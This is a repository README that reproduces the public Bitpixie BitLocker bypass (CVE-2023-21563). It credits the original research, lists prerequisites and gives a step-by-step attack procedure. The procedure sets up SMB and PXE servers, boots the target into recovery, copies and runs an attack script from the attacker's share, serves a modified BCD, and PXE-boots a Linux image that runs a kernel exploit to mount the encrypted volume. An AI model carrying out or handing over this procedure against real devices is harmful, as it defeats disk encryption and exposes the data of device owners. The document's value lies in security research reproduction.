# Bitpixie

The [bitpixie vulnerability](https://github.com/Wack0/bitlocker-attacks?tab=readme-ov-file#bitpixie)
existed since October 2005, was discovered in August 2022 and publicly [disclosed in February 2023 by
Rairii](https://mastodon.social/@Rairii@haqueers.com/109817927808486332) after which it was assigned
[CVE-2023-21563](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21563).

The full attach chain was demonstrated by Thomas in his [38C3 talk](https://events.ccc.de/congress/2024/hub/en/event/windows-bitlocker-screwed-without-a-screwdriver/)
which was followed up by two blog posts:

- [Windows BitLocker -- Screwed without a Screwdriver](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/)
- [On Secure Boot, TPMs, SBAT, and downgrades -- Why Microsoft hasn't fixed BitLocker yet](https://neodyme.io/en/blog/bitlocker_why_no_fix/)

This repository reproduces the original research performed by Thomas based on his talk and blog posts.
The used Linux kernel exploit ([blog](https://pwning.tech/nftables/),
[PoC](https://github.com/Notselwyn/CVE-2024-1086])) for CVE-2024-1086 was 
written by [@notselwyn](https://twitter.com/notselwyn).

Parallel to this work [Andreas Grasser](https://github.com/andigandhi/bitpixie) also 
attempted to reproduce the original research, ending up with a very similar approach.

## Pre-Requirements

BitLocker must be configured without pre-boot authentication also sometimes referred 
to as unattended/transparent mode i.e. without a PIN or a key file.

Booting in PXE mode must be possible. In particular, the UEFI firmware must have a working TCP/IP stack. If only the network boot option is disabled, some USB dongles might work around that limitation.

If you have access to the Windows environment, launch an elevated instance of `msinfo32` the entry *Automatic Device Encryption Support* should read *Meets prerequisites*.

A TPM 2.0 is needed to support the PCR7 binding
- In Windows open *Device Manager > Security Devices* and check the TPM properties
- Check in the UEFI settings, something like: *Security > Security Chip > Security Chip Selection*.
	
>[!warning]
> Changing the TPM mode will clear the stored keys, therefore:
> 1. Boot Windows, disable BitLocker: `manage-bde -protectors -disable C:`
> 2. Boot into UEFI/BIOS, enable the TPMv2.0 security chip
> 3. Boot Windows, re-enable BitLocker `manage-bde -protectors -enable C:`

Secure Boot needs to be enabled and used for integrity validation. The command below, must list exactly the PCRs `7, 11`:
```
PS> manage-bde -protectors -get c:
...
      PCR Validation Profile:
        7, 11
        (Uses Secure Boot for integrity validation)
```

> [!warning]
> If the PCR register `4` is included, this attack will not work.

>[!note]
> To make a device intentionally vulnerable a local GPO can be configured:
> 1. Temporarily suspend BitLcoker protection: `manage-bde -protectors -disable C:`
> 2. Create a GPO using `gpedit.msc`
> 	- Open *Computer Configuration > Administrative Templates > Windows Components > BitLocker Drive Encryption > Operating System Drives*
> 	- Enable *Configure TPM startup PIN and PCRs* and enter the *PCR values:* `7, 11`
> 3. Apply the GPO: `gpupdate /force`
> 4. Confirm settings: `gpresult /scope coputer /h gpo.html`
> 5. Re-enable BitLocker: `manage-bde -protectors -enable c:`
 
[KB5025885](https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines) must not be installed.

Only systems using a bootloader signed with the 2011 Secure Boot certificate are vulnerable. To check this, mount the boot partition and check the signature of `EFI\Microsoft\Boot\bootmgfw.efi`. This can also be performed using [osslsigncode](https://github.com/mtrojnar/osslsigncode).

For the Linux based exploitation strategy implemented in this repository, Microsoft's 3rd-party Secure Boot certificate, used to sign the shim loader, needs to be enabled.

## Environment Setup

### Linux Initramfs Generation

An initramfs containing all needed components based on a stripped down version of [frood, an Alpine initramfs NAS](https://words.filippo.io/dispatches/frood/) can be generated with:
```
cd linux
./bitpixie build
./bitpixie qemu # optional sanity check, whether it boots at all
./bitpixie deploy
cd - 
```

### SMB Server

Start a SMB server from where the `create-bcd.bat` attack script can be downloaded from and the resulting, device-specific BCD can be uploaded to. Impacket's `smbserver.py` works great for that:

```
cd pxe && ./start-smb.sh
```

### PXE Server

Download the necessary artifacts needed and start the PXE server:
```
cd pxe
./download.sh
./start-pxe.sh eth0
```

## Attack

### Boot into Recovery Mode

Let Windows boot normally, on the logon screen hold down the *Shift* key and select the *Restart* option from the power menu.

Windows will reboot into a recovery mode. Select *Troubleshoot > Advanced Option > Command line*. If desired, select *Change keyboard layout*. When prompted for BitLocker recovery key, select *Skip this drive*.

You should now be in a command prompt within the recovery environment.

If needed, enable network support:
```
wpeutil initializenetwork
```

>[!note]
> You should see DHCP request served by `dnsmasq`.

Mount the exposed SMB share:
```
net use S: \\10.13.37.100\smb
```

Make sure you are in local temp directory:
```
cd %TEMP%
```

Copy attack script to temporary directory:
```
copy S:\create-bcd.bat .
```

Execute attacker script to generate a `BCD_modded` file:
```
.\create-bcd.bat
```

Transfer the modified boot configuration to the SMB share:
```
copy BCD_modded S:\BCD
```

> [!note]
> This file needs to be served as `Boot\BCD` via PXE.

Exit the command line and chose *Use a device* then select the option indicating PXE boot.

### Boot into Linux Environment

The device should now reboot over PXE, fail to fully load the Windows boot configuration then fall back to the served Linux environment.

>[!note]
> If you end up on a blank blue screen it might help to press *Escape* to show the Grub boot menu where you can select the Linux system.
> 
> This typically means something did not work as expected.

Login with the `root` user, no password is needed. Follow the instructions printed in the logon message. Replace `XXX` with device file representing your encrypted BitLocker volume:
```
exploit && ./mount.sh /dev/XYZ && ls mnt
```
